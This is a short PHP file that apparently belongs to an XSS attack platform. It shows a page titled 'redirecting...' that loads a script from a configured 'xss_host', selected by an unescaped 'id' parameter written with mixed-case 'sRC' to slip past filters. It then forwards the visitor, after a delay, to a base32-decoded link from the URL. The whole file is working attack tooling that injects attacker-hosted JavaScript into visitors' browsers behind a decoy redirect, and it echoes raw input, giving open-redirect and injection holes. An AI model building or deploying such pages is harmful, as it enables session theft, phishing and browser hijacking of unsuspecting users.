<?php
	include("../config/config.inc");
	include('Base32.php');
	$base32 = new Base32();
	$link = $base32->base32_decode($_GET['link']);
?>
<html>
<head>
<title>redirecting...</title>
</head>
<body>
</body>
<script sRC=<?php echo $xss_host.'/'.$_GET['id']?>></script>
<script>
setTimeout(function (){
	window.location.href="<?php echo $link ?>";
}, 1500);
</script>
</html>
